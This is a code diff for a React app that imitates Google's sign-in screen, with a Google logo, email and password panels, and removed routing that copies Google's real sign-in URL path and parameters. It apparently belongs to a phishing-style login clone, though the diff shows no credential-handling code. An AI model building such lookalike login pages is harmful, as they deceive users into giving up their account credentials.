@@ -1,6 +1,5 @@
-import { useEffect, useMemo, useState } from 'react'
+import { useState } from 'react'
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
-import { useNavigate, useParams } from 'react-router-dom'
 import logo from './assets/google.png'
 import { IoMdArrowDropdown } from 'react-icons/io'
 import EmailHeader from './components/EmailHeader'
@@ -10,25 +9,9 @@ import PasswordBody from './components/PasswordBody'
 import Loader from './components/Loader'
 
 function App() {
-  const { emailInAddr } = useParams()
-  const navigate = useNavigate()
   const queryClient = new QueryClient()
   const [isLoading, setIsLoading] = useState<boolean>(false)
   const [email, setEmail] = useState<string>('')
-  const pswdPanel = useMemo(() => {
-    if (emailInAddr) return true
-    return false
-  }, [emailInAddr])
-
-  const setPage: () => void = () => {
-    // When email has been set, move to password url.
-    if (email) {
-      navigate(
-        `/signin/v2/challenge/pwd?checkedDomains=youtube&dsh=S1040298235&emailInAddr=${true}`
-      )
-      return
-    }
-  }
 
   return (
     <QueryClientProvider client={queryClient}>
@@ -38,21 +21,19 @@ function App() {
             <Loader isLoading={isLoading} />
             <div className='flex flex-col items-center mb-10'>
               <img src={logo} className='w-[4.5rem]' />
-              {pswdPanel ? (
+              {email ? (
                 <PasswordHeader email={email} />
               ) : (
                 <EmailHeader />
               )}
             </div>
-            {pswdPanel ? (
+            {email ? (
               <PasswordBody
                 email={email}
-                setPg={setPage}
                 setIsLoading={setIsLoading}
               />
             ) : (
               <EmailBody
-                setPg={setPage}
                 setIsLoading={setIsLoading}
                 passEmail={setEmail}
               />
